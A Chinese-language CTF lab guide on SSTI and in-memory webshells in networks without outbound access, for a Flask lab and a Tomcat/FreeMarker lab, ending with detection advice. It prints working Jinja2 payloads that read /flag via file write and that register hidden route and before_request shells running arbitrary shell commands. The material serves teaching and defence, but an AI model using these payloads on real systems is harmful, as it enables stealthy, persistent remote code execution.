# 不出网 SSTI 与内存马

> 专题文档。原理背景见 [`KNOWLEDGE.md` §8](KNOWLEDGE.md)；两个靶场的完整题解见
> [`../labs/07-flask-memshell/README.md`](../labs/07-flask-memshell/README.md)
> 与 [`../labs/08-freemarker-memshell/README.md`](../labs/08-freemarker-memshell/README.md)。

本仓库有两个「不出网」靶场：

| 靶场 | 端口 | 技术栈 | 内存马形态 | Java/Python payload 是否已在本文验证 |
|------|------|--------|-----------|-----------------------------------|
| `07-flask-memshell` | 8097 | Python / Flask / Jinja2 | 路由型 + `before_request` Filter 型 | ✅ 两个 payload 都在运行中的容器上实测通过 |
| `08-freemarker-memshell` | 8098 | Java 8 / Spring Boot 2.7 / Tomcat | `StandardContext` 注册 `Filter` | ❌ 本文不粘贴 Java payload，见该靶场 README |

---

## 1. 什么是内存马

**内存马（memory shell）**：不落地任何文件，把一段能力**动态注册进正在运行的进程**，
从而在**已有的入站 HTTP 通道**上获得一个可反复调用的 webshell。

"内存" 是字面意思：注册结果只存在于进程的内存数据结构里
（Flask 的 `app.url_map` / `app.view_functions` / `app.before_request_funcs`，
Tomcat 的 `StandardContext` 里的 `FilterDef` / `FilterMap`），
**进程重启即消失**，磁盘上没有任何新文件。

它由两个特性定义：

1. **不落文件** —— 不会出现在 webshell 扫描、文件完整性校验、容器镜像 diff 里；
2. **复用入站通道** —— 不需要目标主动连出去，所以出网被切断也照样能用。

---

## 2. 为什么出网被切断时它是正解

### 2.1 出网是怎么被切断的

`labs/*/entrypoint.sh`（由 `scripts/scaffold_lab.py` 生成；lab 07 实测生效）：

```sh
iptables -A OUTPUT -o eth0 -p tcp --syn -j DROP       # 丢弃新建的对外 TCP 连接
iptables -A OUTPUT -o eth0 -p udp --dport 53 -j DROP  # 丢弃 DNS 查询
```

配合 compose 里的：

```yaml
cap_add:
  - NET_ADMIN        # 没有它 iptables 加不了规则
```

lab 08（Java）的 `entrypoint.sh` 用同样的两条规则，并且额外 `unset GZCTF_FLAG DASFLAG FLAG STATIC_FLAG`
—— 防止选手直接读环境变量拿 flag，逼你真的去打内存马。

### 2.2 为什么「入站还能用」而「出站不能用」

这两条规则的关键在 `--syn`：

```text
容器主动外连：  容器 --SYN--> 外部       ← 第一个包就是 SYN，被 DROP
外部访问容器：  外部 --SYN--> 容器       ← 入向，不被 OUTPUT 链管
                容器 --SYN/ACK--> 外部  ← 回包不是 SYN，不匹配 --syn，放行
```

`-A OUTPUT ... --syn` 只匹配**新建连接的首包**。宿主机映射进来的连接
（`docker run -p 8097:5000`）其回包是 `SYN/ACK` 或普通 `ACK`，
**不匹配 `--syn`**，所以 Tool 的响应能正常发回去。

结论：**入站请求-响应这条路是通的，出海的路是死的**。内存马就是让 payload
搭在这条通路上。

实测自证（lab 07 容器内，两条都应失败）：

```bash
docker exec ssti-07-flask-memshell python -c "import socket; socket.create_connection(('93.184.216.34',80),timeout=5)"
docker exec ssti-07-flask-memshell python -c "import socket; socket.gethostbyname('example.com')"
```

本次验证观测（`labs/07-flask-memshell` 镜像，`--cap-add NET_ADMIN`）：

```text
TCP blocked: TimeoutError
DNS blocked: gaierror
# 同时：GET http://127.0.0.1:19096/ → 200（入站正常）
```

### 2.3 出网被封后，各手法的死活

| 手法 | 出网被封后 | 原因 |
|------|-----------|------|
| 命令回显在响应里 | ✅ 可用 | 不产生新连接 |
| 写文件到 Web 目录 + HTTP 取回 | ✅ 可用 | 同上（lab 07 step3） |
| 内存马 | ✅ 可用 | 同上（lab 07 step4、lab 08） |
| 反弹 shell | ❌ | 目标主动外连，首包 SYN 被丢 |
| DNSLog 外带 | ❌ | UDP/53 被丢 |
| 外连下载 payload | ❌ | 同反弹 shell |
| 时间盲注 | ⚠️ 可用但慢 | 本地计算耗时不受出网影响 |

**注意最后一行**：出网封锁**不**等于「无法带外」。
写文件回显与时间盲注都是不需要出网的带外方式；内存马的价值在于
**可反复调用 + 不落文件 + 隐蔽**，而不是「唯一可行」。

---

## 3. lab 07：Python / Flask 内存马（逐行解释，已验证）

靶场结构（`labs/07-flask-memshell/app.py`）：

- `/profile`：username 被**未转义**拼进模板，过滤 `{{` `}}` `'` `"` `[` `]`
  （`_PROFILE_BAD = re.compile(r"[\"'\[\]]|\{\{|\}\}")`）—— **有回显**，用来确认 SSTI；
- `/admin`：`Host` 头**无过滤**拼进审计模板，但渲染结果**只进内存审计日志、不回显**
  —— 这是真正的投递点；
- `/echo/<path>`：`/app/echo/` 的静态目录 —— 无回显时的 HTTP 侧信道；
- `/console/`：统一控制台（step 0 是一个**有回显的调试台**，上下文与 `/admin` 相同）。

投递约束：**HTTP 头字段值里不能有空格**，所以 Host 头里的 payload 内部
一律用 **TAB** 当空白（Python 与 shell 都把 TAB 当空白）。

`tests/verify_memshell.py` 把整条链在**容器内部**跑了一遍（23 项断言），
本次也在运行中的容器上用等价请求复验过。

### 3.1 写文件侧信道（step 3）—— 内存马之前的过渡

```jinja2
{%set u=cycler.__init__.__globals__.__builtins__%}
{%set _=u.__import__('os').popen('cat</flag>/app/echo/exfil.txt')%}
```

```bash
curl -s localhost:8097/echo/exfil.txt      # → flag{...}
```

- `cat</flag>/app/echo/exfil.txt` 用**重定向**代替空格，整个 payload 零空白
  —— 投递点是 Host 头，这条约束是题目的一部分。
- 实测（本次）：`flag{doc_probe}` ✅。

它为什么还不够：**一次性、有痕迹**（文件留在磁盘上）、每次都要重新投递。
内存马解决的就是这两点。

### 3.2 路由型内存马（step 4a，✅ 实测）

Flask 的公开注册 API 带 `setupmethod` 保护：应用处理过第一个请求之后，
`app.add_url_rule()` / `app.before_request()` 会直接抛 `AssertionError`。
所以内存马必须**绕过公开 API，直接改底层数据结构**：

```jinja2
{%set u=cycler.__init__.__globals__.__builtins__%}
{%set a=u.__import__('flask').current_app%}
{%set R=a.url_map._rules.__getitem__(0).__class__%}
{%set _=a.url_map.add(R('/memshell',endpoint='memshell'))%}
{%set f=u.eval("lambda:__import__('subprocess').check_output(__import__('flask').request.args.get('c','id'),shell=True)")%}
{%set _=a.view_functions.__setitem__('memshell',f)%}
```

逐步拆解：

| 步骤 | 做了什么 | 为什么必须这样写 |
|------|----------|------------------|
| `cycler.__init__.__globals__.__builtins__` | 拿到 `eval` 与 `__import__` | Jinja 表达式里拿不到内置函数，`__builtins__` 是唯一入口 |
| `u.__import__('flask').current_app` | 拿到**运行中的** Flask app | 静态 import 拿不到实例；`current_app` 是 Flask 的本地代理 |
| `a.url_map._rules.__getitem__(0).__class__` | **反推** `werkzeug.routing.Rule` 类 | 见下方「`__import__('a.b')` 的坑」 |
| `a.url_map.add(Rule(...))` | 直接往路由表加一条规则 | 绕过 `app.add_url_rule()` 的 `setupmethod` 断言 |
| `u.eval("lambda: ...")` | **现场造一个视图函数** | Jinja 里没法定义函数；`eval` 出来的 lambda 的 globals 里有完整 `__builtins__`，所以 lambda 内的 `__import__` 可用 |
| `a.view_functions.__setitem__('memshell', f)` | 把 endpoint 映射到视图 | ★ **必须先 `url_map.add()` 再设 `view_functions`**，否则请求会 500（端点无视图） |

实测（本次在运行中的容器上，从宿主机发 Host 头 payload）：

```text
注入 /admin（响应仍是不含命令输出的静态页）→ 200
GET /memshell?c=id          → 200, 'uid=0(root) gid=0(root) groups=0(root)\n'
GET /memshell?c=cat /flag   → 200, 'flag{doc_probe}'
```

`tests/verify_memshell.py` 里的对应断言（容器内 23/23 通过）：

```text
=== 4. 路由型内存马（绕过 setupmethod 保护） ===
  ok   内存路由 /memshell 已生效（200）
  ok   内存路由返回命令输出          # uid=0(root) ...
  ok   内存马读出 /flag
```

### 3.3 `__import__('a.b')` 的坑（最容易踩的一个）

`__import__('werkzeug.routing')` **返回的是顶层包 `werkzeug`，不是子模块
`werkzeug.routing`**。所以照直觉写：

```jinja2
u.__import__('werkzeug.routing').Rule      # ❌ AttributeError / UndefinedError
```

会失败。正确做法是**从已有的实例反推类**，完全不依赖 import 语义：

```jinja2
a.url_map._rules.__getitem__(0).__class__   # ✅ 从现有 Rule 实例拿到 Rule 类
```

同类思路：`type(x)` / `x.__class__` / `x.__mro__` 都可以用来「就地取类」。
Python 里 `from a.b import c` 才等价于拿子模块，而 `__import__` 只保证返回顶层包
（实际上 `importlib.import_module('a.b')` 才返回子模块 —— 但它要写引号，
在 Host 头零空白约束下更麻烦）。

### 3.4 Filter 型内存马（step 4b，✅ 实测）

不注册路由，而是往 `before_request` 钩子链里追加一个函数 —— **对所有路径生效**：

```jinja2
{%set u=cycler.__init__.__globals__.__builtins__%}
{%set a=u.__import__('flask').current_app%}
{%set f=u.eval("lambda:__import__('flask').make_response(__import__('subprocess').check_output(__import__('flask').request.headers.get('X-C','id'),shell=True))if __import__('flask').request.headers.get('X-M')else\tNone")%}
{%set _=a.before_request_funcs.setdefault(None,[]).append(f)%}
```

要点：

- `app.before_request_funcs` 是一个 `{蓝本名: [函数,...]}` 字典，
  **`None` 这个键代表「对所有请求生效」**的全局钩子；
  用 `setdefault(None, []).append(f)` 直接改这个字典 —— 同样绕开了
  `app.before_request()` 的 `setupmethod` 断言。
- **`before_request` 返回非 `None` 会短路整个请求**：返回值被当作响应直接发出，
  后面的视图根本不会执行。所以这个钩子能劫持**任意路径**的响应。
- 不带触发头（`X-M`）时返回 `None`，站点行为完全正常 —— 隐蔽性来自这里。
- payload 里的 `\t` 是真 TAB，用来满足 Host 头无空格约束。

实测（本次，从宿主机）：

```text
注入 /admin → 200（响应是静态页）
GET /            with X-M/X-C → 'uid=0(root) gid=0(root) groups=0(root)\n'
GET /profile     with X-M/X-C → 'uid=0(root) gid=0(root) groups=0(root)\n'
GET /does-not-exist with X-M/X-C → 'uid=0(root) ...'    ← 404 路径也被劫持
GET /  without X-M → 200, 站点正常
```

这就是 Python 版的「Filter 内存马」，与 Java/Tomcat 里往 `StandardContext`
注册 `Filter` 的思路**完全同构** —— 下一节的 Java 靶场就是同一个东西的 JVM 版本。

### 3.5 为什么必须 `python app.py` 启动

`entrypoint.sh` 最后一行是 `exec python /app/app.py`，而不是 gunicorn。
原因写在 entrypoint 的注释里：**部分利用链依赖应用模块名是 `__main__`**
（例如 `sys.modules['__main__'].__dict__['app']`），gunicorn 下模块名会变成
`gunicorn.app.wsgiapp`，链就断了。

另一条更通用的链是 `flask.globals.current_app`（本文两个 payload 用的都是它），
它不挑启动方式。

---

## 4. lab 08：Java / Tomcat 内存马（源码说明，Java payload 见该靶场 README）

> **本文不提供 Java payload。** 该靶场由另一位作者维护，
> 完整的、经过验证的 payload 在
> [`../labs/08-freemarker-memshell/README.md`](../labs/08-freemarker-memshell/README.md)。
> 下面只描述**从源码能确认的结构**。

### 4.1 靶场结构（源码事实）

| 组件 | 文件 | 作用 |
|------|------|------|
| 应用 | `labs/08-freemarker-memshell/src/main/java/com/lab/themepreview/ThemePreviewApplication.java` | Spring Boot 2.7.18 启动类（`pom.xml`） |
| 漏洞点 1 | `labs/08-freemarker-memshell/src/main/java/com/lab/themepreview/service/ThemePreviewService.java` + `labs/08-freemarker-memshell/src/main/java/com/lab/themepreview/web/ThemeController.java` | `GET /theme/preview?template=<ftl>&theme=<name>`：用 `new Template(name, new StringReader(用户模板), configuration)` 渲染**用户提交的模板串** |
| 成因 | `labs/08-freemarker-memshell/src/main/java/com/lab/themepreview/config/FreemarkerConfig.java` | `configuration.setNewBuiltinClassResolver(TemplateClassResolver.UNRESTRICTED_RESOLVER)` |
| 漏洞点 2 | `ThemeController.thymeleafPreview()` | `GET /theme/thymeleaf?theme=<v>`：视图名直接拼 `"theme/" + theme` → Thymeleaf `__${...}__` 预处理 → SpEL |
| 被注入物 | `memshell-plugin/.../MemshellFilter.java` | 一个 `javax.servlet.Filter`，**刻意不打进应用 jar**，编译成字节码后 base64 放进 `labs/08-freemarker-memshell/src/main/resources/memshell/MemshellFilter.class.b64` |
| 注入器 | `labs/08-freemarker-memshell/src/main/java/com/lab/themepreview/memshell/InjectHelper.java` | 实现 FreeMarker 的 `ObjectConstructor`；`?new(servletContext)` 触发构造器注入，`exec()` 把注入结果回显到模板响应 |
| 构建工具 | `build-memshell.ps1` | 用 JDK8 编译 Filter → base64 → 覆写 `InjectHelper.MEMSHELL_CLASS_B64` |
| 元信息接口 | `labs/08-freemarker-memshell/src/main/java/com/lab/themepreview/web/MetaController.java` | `/healthz`、`/api/lab-info`（4 个关卡）、`/api/theme-vars`、`/api/memshell-class` |

### 4.2 为什么它同样「必须做内存马」

- **出网切断方式与 lab 07 完全一致**：`entrypoint.sh` 里
  `iptables -A OUTPUT -o eth0 -p tcp --syn -j DROP` +
  `-A OUTPUT -o eth0 -p udp --dport 53 -j DROP`，`cap_add: [NET_ADMIN]`。
  （本次**未在 Java 容器上实测**这两条规则的效果，方法是照抄 lab 07 的已验证写法。）
- **`entrypoint.sh` 额外 `unset` 了 flag 环境变量**，所以不能靠「读环境变量」绕过，
  必须真的拿到代码执行 + 注册内存马。
- **FreeMarker 版本刻意降到 2.3.29**（`pom.xml` 注释写明）：2.3.30 起
  `freemarker.template.utility.Execute` 被判为 RCE 危险类、移除了内置 `INSTANCE`，
  默认 `?new` 白名单也收紧了。2.3.29 的 `Execute` 是**经典 FreeMarker RCE** 的入口。
  但 `pom.xml` 里也强调：**真正的成因是 `UNRESTRICTED_RESOLVER` 这个配置错误，
  不是版本本身**。
- 内存马的注册路径（`InjectHelper.install()`）是：
  `ServletContext`（`ApplicationContextFacade`）→ 反射取私有字段 `context`
  → `ApplicationContext` → 再取 `.context` → `StandardContext`
  → `addFilterDef` + `addFilterMap` + `filterStart`。
  动态类加载走 `InjectHelper.FlushableClassLoader`（`ClassLoader#defineClass`），
  并优先用应用的 ClassLoader。
- 注入完成后 `GET /memshell?cmd=id`（或 `?b64cmd=<base64>`）直接回显 ——
  走的是**已有的入向 HTTP 通道**，零出网流量（见 `MemshellFilter.doFilter`：
  只有显式带 `cmd`/`b64cmd` 参数时才当 webshell，其它请求原样放行）。

### 4.3 与 lab 07 的对照

| | lab 07（Flask） | lab 08（Tomcat） |
|---|---|---|
| 注册对象 | `app.url_map` + `app.view_functions`（路由型）/ `app.before_request_funcs[None]`（Filter 型） | `StandardContext` 的 `FilterDef` + `FilterMap` |
| 为什么不能用公开 API | `setupmethod` 断言 | 应用已启动，没有「加 Filter」的公开入口 |
| 动态代码 | `eval("lambda: ...")` 现场造函数 | `ClassLoader#defineClass` 加载一段 base64 字节码 |
| 生效范围 | 路由型只在新路径；Filter 型对所有路径 | Filter 映射到 `/*`，对所有路径 |
| 触发方式 | 直接 GET 新路径 / 带特定请求头 | 带 `cmd` 参数的任意请求 |
| 消失条件 | 进程重启 | 进程重启 |

**同一个思想**：不要求目标出网，而是**改运行中进程的内部注册表**。
语言不同，数据结构不同，攻击模型一模一样。

---

## 5. 内存马的检测与防御（写题的人也该知道）

| 手段 | 能发现什么 | 局限 |
|------|-----------|------|
| 文件完整性 / 镜像 diff | 落地 webshell、被改的文件 | ❌ 内存马不落文件 |
| webshell 扫描器 | 磁盘上的 webshell | ❌ 同上 |
| 进程内存中查找新增的 `Filter` / 路由 | 内存马本体 | 需要特权与基线（正常重启也会变） |
| 重启进程 | 一切内存马 | 服务中断；只是清场不是检测 |
| 出网监控 | 反弹 shell / DNSLog | ❌ 内存马不出网 |
| **限制应用进程权限** | 读到 `/flag` 也执行不了命令 | ✅ 最实用的一条 |
| 容器最小化（无 shell / 无 `iptables`） | 命令执行没有落点 | ✅ |

一句话：**内存马无法靠「看磁盘」发现**，只能靠「看运行时状态」或
「让拿到 RCE 也没东西可拿」。这也是为什么本仓库两个靶场都把
`flag` 放在容器里由 entrypoint 写入 —— 你要真拿到执行能力才拿得到。

---

## 6. 相关文件

| 文件 | 说明 |
|------|------|
| [`../labs/07-flask-memshell/app.py`](../labs/07-flask-memshell/app.py) | 四个台阶 + `_PROFILE_BAD` 过滤 + `/echo/` 侧信道 |
| [`../labs/07-flask-memshell/entrypoint.sh`](../labs/07-flask-memshell/entrypoint.sh) | flag 注入 + iptables 断网 |
| [`../tests/verify_memshell.py`](../tests/verify_memshell.py) | 容器内端到端验证（23 项断言，两个 payload 的权威来源） |
| [`../labs/08-freemarker-memshell/`](../labs/08-freemarker-memshell/) | Java 靶场源码（payload 细节见其 README） |
| [`KNOWLEDGE.md`](KNOWLEDGE.md) | §8 是不出网利用的通用原理 |
| [`SOLUTIONS.md`](SOLUTIONS.md) | 横向速查表 |
